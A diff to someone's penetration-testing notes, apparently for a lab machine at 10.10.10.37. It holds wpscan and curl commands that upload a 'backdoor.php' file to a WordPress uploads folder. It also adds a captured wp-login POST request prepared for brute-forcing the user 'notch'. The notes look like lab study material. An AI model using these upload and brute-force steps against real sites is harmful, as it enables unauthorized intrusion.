@@ -90,7 +90,21 @@ wpscan -u 10.10.10.37 -f -e -r
 
 <h2>File upload with curl<h2>
 curl -F 'files[]=@/backdoor.php' http://10.10.10.37/wp-content/uploads/
-
-h
-
 curl -F 'img_avatar=@/backdoor.php' http://10.10.10.37/wp-content/uploads/
+
+
+<h2>Bruteforce</h2>
+login: notch
+ERROR: The password you entered for the username notch is incorrect.
+
+Content-Type: application/x-www-form-urlencoded
+Referer: http://10.10.10.37/wp-login.php
+Cookie: wordpress_test_cookie=WP+Cookie+check
+Upgrade-Insecure-Requests: 1
+
+log=notch&pwd=testpass&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.10.37%2Fwp-admin%2F&testcookie=1
+
+
+
+
+
